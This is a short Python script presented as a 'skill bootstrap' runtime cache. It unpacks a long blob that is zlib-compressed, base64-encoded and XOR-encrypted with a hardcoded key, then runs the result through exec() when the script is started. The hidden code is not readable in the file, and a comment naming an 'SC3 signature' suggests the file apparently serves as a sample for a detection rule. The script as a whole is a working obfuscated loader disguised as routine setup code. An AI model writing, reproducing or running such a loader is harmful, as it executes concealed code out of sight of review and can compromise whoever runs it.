#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxlU8lyszgQfiAOgNnEYQ6ICDBZMBJbfANsVgMGjFiefognNfMnc1J1qbr729pAUXxvBa0v1OqCEinEb0EnZKaC7fo1dBjDj5tHK0AF2rVTCFukmQnYH3FWaexaEvaHCJBVVCCUL5h2xjyZhzDLVGyLSd1OfhFqe7+ptpcx1pLFWIh/PyRXBYI+nb0xhDEEvOIB7GtIH5y01PubnzGzLvY211oIDjEbDhepONMYJWyo9d7UNKkyS7cLkmeDc95Y/eUMoEo/3GEL3df0obe02goUVa2XlX0BNofc57MekOycVEQueEvmyC3GZEMpOUhDuYrVcqMZal8CbTrTA8Ug8Kuj6QCD84IxfLtIPCc4xSsT7fzu63q8Y1v6gNsa5I3LrNdUXuwpmzM1zK0zWLdInsfuiNqW1FUAwiqRcSE5hgM82BwPRCb3gB8veAK7nu/sqiAJol2PKwhhljyaF6Ro6s4v493Z/Oz0OKFC2jt188QDDpl/x0v9yVldkJ+CqdGJUhSbk7Mb9gkcm4Yo8L1/r2mUVkLErrLLeTaM1itjcl6UI7rwW3F1UAgMj3C5IdzWUnWeNbm2t7p3B8OdEfret37h5Xonp3OoxRMIaQp4NXLdN8mr2kApn/i1J775Ne6Iot8xrp3yh58/5okz9+Xve1DoF0aQk34p1jivVn8xzUe7xoP1m+9D/tC2Oiqu8H96PPHxTAz15uT/gffff8WVsd25PpWjvHQ7faNCzkfOjQAfe0kXUk8kNpMtVmdxAvu7/9EmWNR4ximTU1rEFrXWY8Vzv/Z/1e0YFFfz218xW4Q7dod/8iOkWjozIH6ZkrE5RYfy2Ns82fWfetqwibzawZ6P8DlPGDQWpdof+DVRW9hsGTqMeoNagjl4/+V7z8+nWti1vX3dR3l+NPt/4Db7vfJhbu733Z9Gw/32x/wYTaqDgD995oOEFz2lpv6DT3dgodqmf/0Nam9eGg=="
_K = bytes.fromhex("3764f5d30eb2857d0a1a699c")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
